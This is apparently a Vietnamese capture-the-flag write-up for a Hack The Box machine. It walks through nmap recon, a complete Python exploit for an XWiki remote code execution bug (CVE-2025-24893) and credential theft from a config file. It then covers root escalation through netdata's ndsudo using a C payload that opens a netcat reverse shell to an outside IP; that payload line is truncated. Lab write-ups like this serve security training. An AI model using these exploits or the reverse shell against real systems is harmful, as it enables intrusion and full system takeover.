![image](https://hackmd.io/_uploads/r1Cujfvdxl.png)

# Machine info and Comment
## Machine info
Đây là một máy đang active nên chưa có thông tin về máy này [Link](https://app.hackthebox.com/machines/684)

## Comment
Hướng dẫn đấm nhà từ đại ka Sơn

# Recon
## nmap
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-webdav-scan: 
|   Server Type: Jetty(10.0.20)
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.55.64:8080/xwiki/bin/view/Main/
|_http-server-header: Jetty(10.0.20)
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug  4 15:50:19 2025 -- 1 IP address (1 host up) scanned in 25.14 seconds
```

Add domain vào `/etc/hosts`
```
echo "10.10.11.80 editor.htb" | sudo tee -a /etc/hosts
```

# User flag
## CVE-2025-24893
Trong `Quick Links-Documentation `, chúng ta thấy một sub-domain được trỏ đến `wiki.editor.htb/xwiki/`

![image](https://hackmd.io/_uploads/Sk5nAzw_ex.png)

Đây cũng chính là web của port 8080. Sau khi truy cập phát hiện được version của cms này 

![image](https://hackmd.io/_uploads/H1cY1XPdgg.png)

Search trên [exploit-db](https://www.exploit-db.com/) và có một lỗ hổng RCE được công bố ở version này. Tuy nhiên PoC phải chính sửa thì mới chạy được

:::spoiler Source code here
```python=
import argparse
import requests
import re
from urllib.parse import urljoin, quote
import html

BANNER = """
===========================================================
                   CVE-2025-24893
            XWiki Remote Code Execution Exploit
                      Author: Artemir
===========================================================
"""

def extract_output(xml_text):
    decoded = html.unescape(xml_text)
    match = re.search(r"\[}}}(.*?)\]", decoded)
    if match:
        return match.group(1).strip()
    else:
        return None

def exploit(url, cmd):
    headers = {
        "User-Agent": "Mozilla/5.0",
    }

    payload = (
        "}}}{{async async=false}}{{groovy}}"
        f"println('{cmd}'.execute().text)"
        "{{/groovy}}{{/async}}"
    )

    encoded_payload = quote(payload)
    exploit_path = f"/xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded_payload}"
    full_url = urljoin(url, exploit_path)

    try:
        response = requests.get(full_url, headers=headers, timeout=10)
        if response.status_code == 200:
            output = extract_output(response.text)
            if output:
                print("[+] Command Output:")
                print(output)
            else:
                print("[!] Exploit sent, but output could not be extracted.")
                print("[*] Raw response (truncated):")
                print(response.text[:500])
        else:
            print(f"[-] Failed with status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"[-] Request failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2025-24893 - XWiki RCE PoC")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g. http://example.com)")
    parser.add_argument("-c", "--cmd", required=True, help="Command to execute")

    args = parser.parse_args()
    exploit(args.url, args.cmd)
```
:::

Chạy script để RCE
```
python a.py -u http://wiki.editor.htb -c whoami
```

![image](https://hackmd.io/_uploads/SyUMbQvdeg.png)

Tuy nhiên ta cần bước leo sang user `editor` thì mới có thể lấy được user flag. Hướng đến tiếp theo đó là tìm các file config để có thể tìm thấy credntial

Nhờ có Grok, ta biết được file config của Wiki CMS là `hibernate.cfg.xml` thường nằm ở `/usr/lib/xwiki/WEB-INF/`

![image](https://hackmd.io/_uploads/rJcbMXvulg.png)

Với credential thu thập được, ssh và lấy được user flag
```
ssh oliver@editor.htb

oliver@editor: cat user.txt
530771efb9fg*********
```

# Root flag
## linPEAS
Sử dụng [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master) phát hiện được SUID của netdata được chạy root mà ta có thể nhắm đến (đập vào mắt là `ndsudo`)

![image](https://hackmd.io/_uploads/HynA4Dkuxx.png)

## CVE-2024-32019
Search google ta thấy có [hướng dẫn khai thác](https://sploitus.com/exploit?id=5077683C-F7E6-58BE-9375-B5A13A8782C5&utm_source=rss&utm_medium=rss) CVE-2024-32019 

![image](https://hackmd.io/_uploads/r1cKNPydxl.png)

Đầu tiên ta sẽ viết payload `malicious.c` và compile trên máy tấn công. Có thể nhờ grok viết  

![image](https://hackmd.io/_uploads/Hk2FdXDOgg.png)

```c=
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);  // Đặt UID thành root
    setgid(0);  // Đặt GID thành root
    system("rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | /usr/bin/nc 10.10.14.30 4444 > >
    return 0;
}
```

Upload vào `/tmp/` sau đó set vào `PATH`

```
oliver@editor: cd /tmp
oliver@editor: curl -o malicious http:<IP>:1234/malicious.c
oliver@editor: chmod +x malicious

oliver@editor: export PATH=/tmp:$PATH
```

Chạy lại `ndsudo` và lấy được root flag

```
oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

![image](https://hackmd.io/_uploads/SJMOEPk_gl.png)

------------------------------------------ Editor has been Pwned! ------------------------------------------

![image](https://hackmd.io/_uploads/BkJFKmw_ge.png)
